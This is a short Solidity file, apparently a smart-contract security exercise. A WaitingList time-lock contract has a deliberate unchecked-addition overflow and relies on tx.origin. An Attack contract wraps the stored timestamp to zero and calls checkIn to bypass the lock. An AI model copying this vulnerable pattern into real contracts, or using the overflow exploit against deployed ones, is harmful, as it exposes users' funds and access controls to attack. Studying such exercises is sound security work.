// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract WaitingList {
    bool public WaitingTimeExpired = false;

    mapping(address => uint256) public WaitingTime;

    constructor() {
        WaitingTime[msg.sender] = block.timestamp + 4 weeks;
    }

    function laterDate(uint256 _schedule) public {
        unchecked {
            WaitingTime[tx.origin] += _schedule;
        }
    }
    
    function checkIn() public {
        require(
            block.timestamp > WaitingTime[tx.origin],
            "Waiting Time not expired"
        );
        WaitingTimeExpired = true;
    }

    function timeToWait() external view returns (uint256) {
        return
            block.timestamp >= WaitingTime[msg.sender]
                ? 0
                : WaitingTime[msg.sender] - block.timestamp;
    }
}

contract Attack {
    function attack(address _addr) public {
        unchecked {
            WaitingList(_addr).laterDate(
                type(uint256).max +
                    1 -
                    WaitingList(_addr).WaitingTime(msg.sender)
            );
        }
        WaitingList(_addr).checkIn();
    }
}
